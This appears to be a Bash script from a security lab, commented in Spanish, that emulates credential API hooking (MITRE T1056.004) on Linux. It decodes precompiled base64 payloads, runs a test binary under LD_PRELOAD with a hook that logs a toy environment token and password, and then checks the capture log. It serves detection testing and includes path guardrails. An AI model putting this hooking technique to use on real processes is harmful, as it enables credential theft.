#!/usr/bin/env bash
# ============================================================================
# ATA035_rev · T1056.004 Credential API Hooking — repetición auditada (motivo: pre-staging)
# ----------------------------------------------------------------------------
# Corrección metodológica (§C): el PAYLOAD precompilado (`hook.so` + `credfetch`) y la
#   credencial simulada se MATERIALIZAN ANTES de t0 (modo prestage). La ventana ejecuta
#   SOLO la acción de la técnica: `LD_PRELOAD=hook.so credfetch` (el hook de la API).
# Fuente: custom (las atómicas de ART son Windows; sin cambio de mecanismo).
#
# Uso:  bash ATA035_ataque_rev.sh prestage   # ANTES de t0 (materializa payload + credencial + log)
#       bash ATA035_ataque_rev.sh attack     # ventana [t0,t1] (solo LD_PRELOAD credfetch)
# Elevación: NO (usuario angel).
#
# GUARDARRAILES: todo bajo $HOME/lab-attack/ATA035/; LD_PRELOAD SOLO a ESE hook.so;
#   SOLO se ejecuta el proceso DE LABORATORIO `credfetch`.
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA035"
HOKB64="${BASE}/ATA035_hook.so.b64"
CFB64="${BASE}/ATA035_credfetch.b64"
SO="${BASE}/hook.so"
CF="${BASE}/credfetch"
LOGF="${BASE}/hook_capture.log"
CRED="${BASE}/credencial_simulada.txt"
TOKEN="toy-token-4242"
PASSWORD="clave-simulada-7777"
MODE="${1:-attack}"

echo "ATA035_rev · T1056.004 Credential API Hooking (LD_PRELOAD) — repeticion (pre-staging)"
echo "MODE=${MODE}"

for t in base64 chmod sha256sum cat grep; do
  command -v "$t" >/dev/null 2>&1 || { echo "ERROR: $t no disponible" >&2; exit 1; }
done

if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: todo bajo la carpeta del ataque; LD_PRELOAD solo a ESE hook.so.
for p in "$SO" "$CF" "$LOGF" "$CRED"; do
  case "$p" in
    "$HOME/lab-attack/ATA035/"*) : ;;
    *) echo "ERROR: ruta '$p' fuera de lab-attack/ATA035 (abortado por seguridad)" >&2; exit 1 ;;
  esac
done
case "$BASE" in
  "$HOME/lab-attack/ATA035"*) : ;;
  *) echo "ERROR: BASE fuera de lab-attack/ATA035; ABORTADO" >&2; exit 1 ;;
esac

if [ "$MODE" = "prestage" ]; then
  # 0) MATERIALIZAR el payload PRE-COMPILADO (decodificacion base64) ANTES de t0.
  base64 -d "$HOKB64" > "$SO"
  base64 -d "$CFB64" > "$CF"
  chmod 700 "$CF"
  chmod 600 "$SO"
  # credencial SIMULADA (dato de juguete) y log vacio (el hook hara O_APPEND en la ventana)
  cat > "$CRED" <<TXT
${PASSWORD}
TXT
  : > "$LOGF"
  echo "--- payload (pre-staging, antes de t0) ---"
  ls -l "$SO" "$CF" "$CRED" "$LOGF"
  sha256sum "$SO" "$CF"
  echo "PRESTAGE=OK (hook.so + credfetch + credencial + log preparados ANTES de t0)"
  exit 0
fi

# ---- modo attack (ventana): SOLO la accion de la tecnica ----
[ -f "$SO" ] && [ -x "$CF" ] || { echo "ERROR: falta el payload (¿prestage ANTES de t0?)" >&2; exit 1; }
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

echo "--- ejecucion con LD_PRELOAD (hook de API) ---"
SERVICE_TOKEN="$TOKEN" LD_PRELOAD="$SO" "$CF" "$CRED"
rc=$?
echo "credfetch_rc=${rc}"

# PRUEBA DEL EFECTO (independiente de la alerta): el hook capturo lo interceptado.
echo "--- hook_capture.log ---"
cat "$LOGF"

cap_token=0
cap_pass=0
grep -q "SERVICE_TOKEN ${TOKEN}" "$LOGF" && cap_token=1
grep -q "fgets ${PASSWORD}" "$LOGF" && cap_pass=1
echo "capturado_token_env=${cap_token}"
echo "capturado_password_file=${cap_pass}"

if [ "$rc" -eq 0 ] && [ "$cap_token" -eq 1 ] && [ "$cap_pass" -eq 1 ]; then
  echo "CRED_API_HOOKING=OK (hook LD_PRELOAD capturo token de entorno y contrasena de fichero)"
else
  echo "CRED_API_HOOKING=FALLO (revisar el hook)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
